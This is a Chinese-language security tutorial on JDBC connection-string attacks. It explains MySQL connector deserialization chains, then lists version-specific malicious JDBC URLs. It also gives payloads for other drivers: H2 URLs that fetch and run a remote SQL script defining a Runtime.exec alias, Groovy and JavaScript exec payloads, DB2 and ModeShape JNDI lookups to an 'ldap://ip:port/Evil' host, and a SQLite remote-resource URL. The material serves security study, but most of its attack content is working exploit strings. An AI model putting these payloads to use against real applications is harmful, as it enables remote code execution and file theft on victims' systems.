# JDBC攻击

- [JDBC应用](#jdbc应用)
  
- [JDBC攻击-mysql](#jdbc攻击-mysql)
  - [ServerStatusDiffInterceptor调用链](#serverstatusdiffinterceptor调用链)
  - [detectCustomCollations调用链](#detectcustomcollations调用链)
  - [payload](#payload)

- [JDBC攻击-其他数据库](#jdbc攻击-其他数据库)
  - [H2](#h2)
  - [DB2](#db2)
  - [SQLite](#sqlite)
  - [ModeShape](#modeshape)

- [JDBC攻击-文件读取](#jdbc攻击-文件读取)




JDBC（Java DataBase Connectivity），是Java程序访问数据库的标准接口。常用的关系数据库包括：付费的（`Oracle、SQL Server、DB2、Sybase`）、开源的（`MySQL、PostgreSQL、Sqlite`）。JDBC接口通过JDBC驱动来访问数据库，而JDBC驱动由各个数据库厂商提供，也就是不同的数据库对应有各自的驱动。使用JDBC的好处就是不需要根据不同的数据库做开发，拥有统一的接口。

## jdbc应用

假如使用MySQL的JDBC驱动，只需要在maven中引入对应的jar包。scope设置为runtime，因为编译时并不需要此jar包，只在运行期使用。
```
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.47</version>
    <scope>runtime</scope>
</dependency>
```

使用jdbc连接mysql中student数据库（mysql驱动后面跟的可选扩展参数包括`loadDataLocal、requireSSL、socksProxyHost、useAsyncProtocol、useServerPrepStmts、allowUrlInLoadLocal`等）
```java
String JDBC_URL = "jdbc:mysql://localhost:3306/student?requireSSL=false";
String JDBC_USER = "root";
String JDBC_PASSWORD = "password";
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) { // 获取数据库连接
    try (Statement stmt = conn.createStatement()) {
        try (ResultSet rs = stmt.executeQuery("SELECT id, name FROM students WHERE id=1")) {
            while (rs.next()) { // 获取列数据
                int id = rs.getInt(1); // ResultSet 索引从1开始，而不是0
                String name = rs.getString(2);
            }
        }
    }
}
conn.close();
```

`Statement`容易引发SQL注入，想要完全避免SQL注入可以使用`PreparedStatement`，使用占位符的方式。
```java
try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD)) {
    try (PreparedStatement ps = conn.prepareStatement("SELECT id, name FROM students WHERE id=?")) {
        ps.setObject(1, id);
        try (ResultSet rs = ps.executeQuery()) {
            while (rs.next()) {
                int id = rs.getInt("id");
                String name = rs.getString("name");
            }
        }
    }
}
```

## jdbc攻击-mysql

上面提到mysql驱动的URL可选扩展参数有很多，其中一个叫做`autoDeserialize`，如果配置为true，客户端会自动反序列化服务端返回的数据。mysql-connector-java.jar中的类`com/mysql/cj/jdbc/result/ResultSetImpl.class#getObject()`方法如下。如果autoDeserialize属性值为true，就会进行反序列化操作。
```java
byte[] data = this.getBytes(columnIndex);
if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
    return data;
} else {
    Object obj = data;
    if (data != null && data.length >= 2) {
        ...
        try {
            ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
            ObjectInputStream objIn = new ObjectInputStream(bytesIn);
            obj = objIn.readObject();
            objIn.close();
            bytesIn.close();
        } 
}
```
但是默认情况下客户端不会调用getObject()方法。就像找反序列化调用链一样需要找到上层的调用。

### serverstatusdiffinterceptor调用链

https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf这篇给出的链条如下
```
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#postProcess/preProcess()
  com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()
    ResultSetUtil#resultSetToMap()
```
最终走到的resultSetToMap方法如下，调用了getObject()方法
```java
public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
    while (rs.next()) {
        mappedValues.put(rs.getObject(1), rs.getObject(2));
    }
}
```
`ServerStatusDiffInterceptor`实现自QueryInterceptor接口，它对应扩展参数queryInterceptors。那么就可以构造一个恶意的JDBC URI来触发反序列化。
```
jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```
### detectcustomcollations调用链

这条链最终也是走到resultSetToMap方法，核心是`com.mysql.jdbc.ConnectionImpl#buildCollationMapping()`方法，如果满足版本大于4.1.0并且detectCustomCollations值为true，就会调用到resultSetToMap方法，最终进行反序列化操作。
```java
if (this.versionMeetsMinimum(4, 1, 0) && this.getDetectCustomCollations()) { // 版本大于4.1.0，detectCustomCollations值为true
    java.sql.Statement stmt = null;
    ResultSet results = null;

    try {
        sortedCollationMap = new TreeMap();
        customCharset = new HashMap();
        customMblen = new HashMap();
        stmt = this.getMetadataSafeStatement();

        try {
            results = stmt.executeQuery("SHOW COLLATION");
            if (this.versionMeetsMinimum(5, 0, 0)) {
                Util.resultSetToMap(sortedCollationMap, results, 3, 2); // 调用resultSetToMap()
        }...
}
```

因为是服务端攻击客户端，还需要一个恶意的mysql服务端。这部分可以用工具: https://github.com/fnmsd/MySQL_Fake_Server

恶意mysql服务器的核心思路是将反序列化数据存储在对应的数据表中对应字段中。以detectCustomCollations调用链为例`Util.resultSetToMap(sortedCollationMap, results, 3, 2);`会对第三个字段进行获取，那么就需要创建一张表，列出至少三个字段，并将ysoserial生成的反序列化数据赋值给第三个字段。

### payload

另外由于不同版本jdbc扩展参数可能存在差异，工具中也给出了不同版本下的利用URI
```
# 8.x
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

# 6.x
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

# 5.1.11及以上的5.x版本 
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc

jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc

Ps: 如果是读文件需要加maxAllowedPacket=655360

# 5.1.10及以下的5.1.X版本: ServerStatusDiffInterceptor同5.x版本，但是需要连接后执行查询。detectCustomCollations不可用

# 5.0.x: 不存在ServerStatusDiffInterceptor，也不存在detectCustomCollations
```

## jdbc攻击-其他数据库
### h2
```
# 远程拉取sql脚本
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8089/poc.sql'

poc.sql: CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "run";}';CALL EXEC ('open -a Calculator.app')

# Groovy
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'"

String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";

# jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test1 BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '" + javascript + "'"

String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
```

### db2
```
jdbc:db2://127.0.0.1:5001/test:clientRerouteServerListJNDIName=ldap://ip:port/Evil;
```

### sqlite
```
jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db
```

### modeshape
```
jdbc:jcr:jndi:ldap://ip:port/Evil
```

## jdbc攻击-文件读取
这篇文章已经说的很全了，漏洞定位`com.mysql.jdbc.MysqlIO#sendFileToServer`
https://lorexxar.cn/2020/01/14/css-mysql-chain/#Load-data-infile


